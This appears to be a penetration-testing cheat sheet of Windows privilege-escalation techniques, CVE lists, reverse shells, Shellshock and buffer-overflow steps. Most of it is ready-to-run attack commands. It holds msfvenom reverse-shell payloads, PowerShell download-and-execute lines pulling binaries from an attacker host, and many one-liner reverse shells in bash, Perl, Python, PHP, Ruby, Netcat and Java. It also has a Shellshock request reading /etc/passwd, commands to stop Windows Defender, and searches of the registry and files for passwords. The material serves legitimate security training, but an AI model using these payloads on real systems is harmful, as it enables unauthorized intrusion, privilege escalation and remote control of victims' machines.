##### Autorun
- Detection
  - `powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"`
  - 
    ```
    [*] Checking for modifiable registry autoruns and configs...

    Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
    Path           : "C:\Program Files\Autorun Program\program.exe"
    ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}\
    ```

- or

##### winPEAS.exe
- 
  ```
  [+] Autorun Applications(T1010)
      Folder: C:\Program Files\Autorun Program
      File: C:\Program Files\Autorun Program\program.exe
      FilePerms: Everyone [AllAccess]
  ```

- Exploitation
- Attacker
  - 
    ```
    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
    sudo python -m SimpleHTTPServer 80
    sudo nc -lvp <PORT>
    ```

- Victim
  - 
    ```
    cd C:\Program Files\Autorun Program\
    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')

    To execute it with elevated privileges we need to wait for someone in the Admin group to login.
    ```

##### AlwaysInstallElevated
- Detection
- 
    ```
    powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

    [*] Checking for AlwaysInstallElevated registry key...

    AbuseFunction : Write-UserAddMSI
    ```

- or
  - 
    ```
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer
    reg query HKCU\Software\Policies\Microsoft\Windows\Installer

    If both values are equal to 1 then it's vulnerable.
    ```

- or
  - 
    ```
    winPEAS.exe

    [+] Checking AlwaysInstallElevated(T1012)

      AlwaysInstallElevated set to 1 in HKLM!
      AlwaysInstallElevated set to 1 in HKCU!
    ```

- Exploitation
- Attacker
- 
  ```
  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > program.msi
  sudo python -m SimpleHTTPServer 80
  sudo nc -lvp <PORT>
  ```

- Victim
- 
  ```
  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.msi', 'C:\Temp\program.msi')
  msiexec /quiet /qn /i C:\Temp\program.msi
  ```

##### Executable Files
- Detection
- 
  ```
  powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

  [*] Checking service executable and argument permissions...

  ServiceName                     : filepermsvc
  Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
  ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
  ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
  ModifiableFileIdentityReference : Everyone
  StartName                       : LocalSystem
  AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
  CanRestart                      : True
  ```

- or
- 
  ```
  winPEAS.exe

  [+] Interesting Services -non Microsoft-(T1007)

  filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]
  ```

- Exploitation
- Attacker
- 
  ```
  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
  sudo python -m SimpleHTTPServer 80
  sudo nc -lvp <PORT>
  ```

- Victim
  - 
    ```
    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', 'C:\Temp\program.exe')
    copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
    sc start filepermsvc
    ```

##### Startup applications
- Detection
- 
  ```
  icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

  C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
                                                              TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
                                                              NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                              BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                              BUILTIN\Users:(I)(OI)(CI)(RX)
                                                              Everyone:(I)(OI)(CI)(RX)

  If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
  ```

- Exploitation
- Attacker
- 
  ```
  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
  sudo python -m SimpleHTTPServer 80
  sudo nc -lvp <PORT>
  ```

- Victim
- 
  ```
  cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')

  To execute it with elevated privileges we need to wait for someone in the Admin group to login.
  ```

##### Weak service permission
- Detection
  - 
    ```
    # Find all services authenticated users have modify access onto
    accesschk.exe /accepteula -uwcqv "Authenticated Users" *

    if SERVICE_ALL_ACCESS then vulnerable

    # Find all weak folder permissions per drive.
    accesschk.exe /accepteula -uwdqs Users c:\
    accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

    # Find all weak file permissions per drive.
    accesschk.exe /accepteula -uwqs Users c:\*.*
    accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
    ```

- or
  - 
    ```
    powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

    [*] Checking service permissions...

    ServiceName   : daclsvc
    Path          : "C:\Program Files\DACL Service\daclservice.exe"
    StartName     : LocalSystem
    AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
    CanRestart    : True
    ```

- or
  - 
    ```
    winPEAS.exe

    [+] Interesting Services -non Microsoft-(T1007)

    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
      YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles

    [+] Modifiable Services(T1007)
      LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
      daclsvc: WriteData/CreateFiles
    ```
- Exploitation
  - 
    ```
    # Attacker
    sudo python -m SimpleHTTPServer 80
    sudo nc -lvp <PORT>

    # Victim
    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
    sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
    sc start <SERVICENAME>
    or 
    net start <SERVICENAME>
    ```

##### Unquoted service paths
- Detection
  - 
  ```
  powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

  [*] Checking for unquoted service paths...

  ServiceName    : unquotedsvc
  Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
  ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
  StartName      : LocalSystem
  AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
  CanRestart     : True

  ServiceName    : unquotedsvc
  Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
  ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
  StartName      : LocalSystem
  AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
  CanRestart     : True
  ```

- or
  - 
  ```
  winPEAS.exe

  [+] Interesting Services -non Microsoft-(T1007)

  unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
  ```

- Exploitation
  - 
  ```
  # Attacker
  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Common.exe
  sudo python -m SimpleHTTPServer 80
  sudo nc -lvp <PORT>

  # Victim
  cd "C:\Program Files\Unquoted Path Service\"
  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', '.\Common.exe')
  sc start unquotedsvc
  ```

- Hot potato
  - Exploitation
    - 
      ```
      # Attacker
      sudo python -m SimpleHTTPServer 80
      sudo nc -lvp <PORT>

      # Victim
      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Tater.ps1.exe', '.\Tater.ps1.exe')
      powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <IP> <PORT> -e cmd.exe' }"
      ```

##### CVE
- Already compiled exploit
  - <https://github.com/SecWiki/windows-kernel-exploits>
  - <https://github.com/abatchy17/WindowsExploits>
  - <https://github.com/cyber-prog0x/PoC-Bank>

- Windows XP
- 
  ```
  CVE:Description
  CVE-2002-1214:ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS
  CVE-2003-0352:ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service
  CVE-2003-0533:MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service
  CVE-2003-0719:ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow
  CVE-2003-0812:ms03_049_netapi - exploits a stack buffer overflow in the NetApi32
  CVE-2003-0818:ms04_007_killbill - vulnerability in the bit string decoding code in the Microsoft ASN.1 library
  CVE-2003-0822:ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051
  CVE-2004-0206:ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service
  CVE-2010-3138:EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse
  CVE-2010-3147:EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse
  CVE-2010-3970:ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution
  CVE-2011-1345:Internet Explorer does not properly handle objects in memory - allows remote execution of code via object
  CVE-2011-5046:EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution
  CVE-2012-4349:Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root
  ```

- Windows 7
- 
  ```
  CVE:Description
  CVE-2010-0232:ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit
  CVE-2010-2568:ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload
  CVE-2010-2744:EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation
  CVE-2010-3227:EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution
  CVE-2014-4113:ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution
  CVE-2014-4114:ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution
  CVE-2015-0016:ms15_004_tswbproxy - abuses a process creation policy in Internet Explorer’s sandbox - code execution
  CVE-2018-8494:remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input
  ```

- Windows 8
- 
  ```
  CVE:Description
  CVE-2013-0008:ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation
  CVE-2013-1300:ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation
  CVE-2013-3660:ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption
  CVE-2013-3918:ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution
  CVE-2013-7331:ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine’s filenames
  CVE-2014-6324:ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation
  CVE-2014-6332:ms14_064_ole_code_execution - exploits the Windows OLE Automation array vulnerability
  CVE-2014-6352:ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution
  CVE-2015-0002:ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation
  ```

- Windows 10
- 
  ```
  CVE:Description
  CVE-2015-0057:exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine
  CVE-2015-1769:MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege
  CVE-2015-2426:ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver
  CVE-2015-2479:MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege
  CVE-2015-2513:MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution
  CVE-2015-2423:MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure
  CVE-2015-2431:MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution
  CVE-2015-2441:MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution
  ```

- Windows Server 2003
- 
  ```
  CVE:Description
  CVE-2008-4250:ms08_067_netapi - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX
  CVE-2017-8487:allows an attacker to execute code when a victim opens a specially crafted file - remote code execution
  ```

### Windows Troublshooting

- Have you checked for vuln apps in program files?
- Have you noticed any running processes that look obviously suspicious?
- Have you check all files in /Users directory (ie. /Desktop, /Documents
- Have you checked for hidden files?
- `dir /ah`


## PROOFS
- Linux
  `echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "`
- Windows
  - `echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"`


## REVERSE SHELL
- More reverse shell
  - [swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
  - [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
  - [highon.coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
  - [Cool Reverse Shell Generator](https://0day.exposed/reverseshell/)

- Amazing tool for shell generation (Should be installed if you used my Kali_setup.sh script)
- Download
  - `git clone https://github.com/ShutdownRepo/shellerator`
- Install requirements
  - `pip3 install --user -r requirements.txt`
- Executable from anywhere
  - `sudo cp shellrator.py /bin/shellrator`


- Bash
  - `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`

- Perl
  - `perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

- Python
  - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<Port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

- PHP
  - `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

- Ruby
  - `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

- Netcat
  - `nc -e /bin/sh 10.0.0.1 1234`
  - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f`

- Java
  - 
  ``` 
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
  ```

- Interactive shell
  - Python
    - `python -c 'import pty; pty.spawn("/bin/bash")'`
    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`

  - Bash
    - `echo os.system('/bin/bash')`

  - Sh
    - `/bin/bash -i`

  - Perl
    - `perl -e 'exec "/bin/bash"'`

  - Ruby
    - `exec "/bin/bash"`

  - Lua
    - `os.execute('/bin/bash')`

- Adjust Interactive shell
  - 
    ```
    stty size # Find your terminal size -> 50 235
    Ctrl-Z
    stty raw -echo  // Disable shell echo
    fg
    export SHELL=bash
    export TERM=xterm OR export TERM=xterm-256color
    stty rows 50 columns 235
    ```


## SHELLSHOCK
- `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>`


## Buffer Overflow
- <https://github.com/cytopia/badchars>
- Spike
  - `generic_send_tcp 192.168.174.1 31337 ~/Code/buffer-overflow/stats.spk 0 0`

- Fuzz
  - `~/Code/buffer-overflow/fuzzer.py`

- Generate unique pattern:
  - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bufferlen>`

- Finding the offset
  - `~/Code/buffer-overflow/offset.py`
  - (1) `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <bufferlen> -q <EIP address>`
  - (1) `!mona findmsp`

- Confirm offset
  - `~/Code/buffer-overflow/overwrite_eip.py`
- Find badchars
  - `~/Code/buffer-overflow/badchars.py`

- Find Jump
  - `!mona modules`
  - `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb > JMP ESP`
  - (1) `!mona find -s "\xff\xe4" -m <unprotected module>`
  - (1) `!mona jmp -r ESP -m <unprotected module> / !mona jmp -r esp -cpb "<badchars>"`

- Exploit buffer overflow
  - (1) `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.174.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
  - (1) `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.174.128 LPORT=4444 -f c -b "\x00,\x20"`
  - `~/Code/buffer-overflow/exploit_buffer_overflow.py`


## USEFUL LINUX COMMANDS
- Find a file
  - `locate <FILE>`
  - `find / -name "<FILE>"`
- Active connection
  - `netstat -lntp`
- List all SUID files
  - `find / -perm -4000 2>/dev/null`
- Determine the current version of Linux
  - `cat /etc/issue`
- Determine more information about the environment
  - `uname -a`
- List processes running
  - `ps -faux`
- List the allowed (and forbidden) commands for the invoking use
  - `sudo -l`


## USEFUL WINDOWS COMMANDS
- General Config Commands
  - `net config Workstation`
  - `systeminfo`
  - `net users`
- Networking Commands
  - `ipconfig /all`
  - `netstat -ano`
- Whats Going on
  - `schtasks /query /fo LIST /v`
  - `tasklist /SVC`
  - `net start`
  - `DRIVERQUERY`
- Registry Queries
  - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
  - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
- PasswordS tuff
  - `dir /s pass == cred == vnc == .config`
  - `findstr /si password *.xml *.ini *.txt`
  - `reg query HKLM /f password /t REG_SZ /s`
  - `reg query HKCU /f password /t REG_SZ /s`
- Disable windows defender
  - `sc stop WinDefend`
- Bypass restriction
  - `powershell -nop -ep bypass`
- List hidden files
  - `dir /a`
- Find a file
  - `dir /b/s "<FILE>"`

## ZIP
- `fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip`
- `zip2john file.zip > zip.john`
- `john --wordlist=<PASSWORDS_LIST> zip.john`

## MISCELLANEOUS
- Get a Windows path without spaces
  - path.cmd
    - 
      ```
      @echo off
      echo %~s1
      ```

  - `path.cmd "C:\Program Files (x86)\Common Files\test.txt"`
  - C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces